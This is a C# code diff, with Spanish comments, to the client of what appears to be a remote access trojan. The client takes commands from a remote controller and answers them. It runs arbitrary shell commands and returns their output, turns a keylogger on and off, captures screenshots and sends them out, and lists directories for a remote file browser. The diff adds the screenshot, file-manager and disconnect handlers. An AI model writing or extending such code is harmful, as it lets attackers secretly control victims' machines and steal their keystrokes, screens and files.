@@ -7,6 +7,7 @@ using Client.Native;
 using Client.Commands;
 using Client.Util;
 using Client.Conexion;
+using Microsoft.Extensions.Logging;
 
 namespace Client
 {
@@ -65,20 +66,65 @@ namespace Client
                             switch (ch)
                             {
                                 case Channel.CommandOutput:
+                                    //Uso ClientSocket.Send ya que trabaja con string
                                     string cmd = Encoding.UTF8.GetString(payload);
                                     ClientSocket.SendResponse(HandleCommands.ExecuteCommand(cmd.Substring(5)),Channel.CommandOutput);
                                     break;
-
                                 case Channel.Keylogger:
+
                                     if(Encoding.UTF8.GetString(payload) == "keylogger")
                                     {
                                         Keylogger.Start();
+                                        
                                     }
                                     else if(Encoding.UTF8.GetString(payload) == "keylogger stop")
                                     {
                                         Keylogger.Stop();
+                                        
                                     }
-                                break;
+                                    break;
+                                case Channel.Screenshot:
+                                    if (Encoding.UTF8.GetString(payload) == "screenshot")
+                                    {
+                                        //Uso Protocol.Send ya que trabaja con bytes
+                                        byte[] clientScreenshot = Screenshot.CaptureScreen();
+                                        Protocol.Send(stream, Channel.Screenshot, clientScreenshot);
+                                    }
+                                    break ;
+                                case Channel.Main:
+                                    string command = Encoding.UTF8.GetString(payload);
+                                    if (command.StartsWith("disconnect"))
+                                    {
+                                        ClientSocket.disconnect();
+                                        return;
+                                    }
+                                    break;
+                                case Channel.FileManager:
+
+                                    string ruta = Encoding.UTF8.GetString(payload);
+                                    if (!Directory.Exists(ruta))
+                                        return;
+
+                                    StringBuilder sb = new StringBuilder();
+                                    sb.AppendLine(ruta); // línea 0: ruta padre
+
+                                    try
+                                    {
+                                        foreach (var dir in Directory.GetDirectories(ruta))
+                                            sb.AppendLine("[DIR]" + dir);
+
+                                        foreach (var file in Directory.GetFiles(ruta))
+                                            sb.AppendLine("[FILE]" + file);
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        sb.AppendLine("[ERROR] " + ex.Message);
+                                    }
+
+                                    ClientSocket.SendResponse(sb.ToString(), Channel.FileManager);
+
+                                    break;
+
 
                             }
                         }
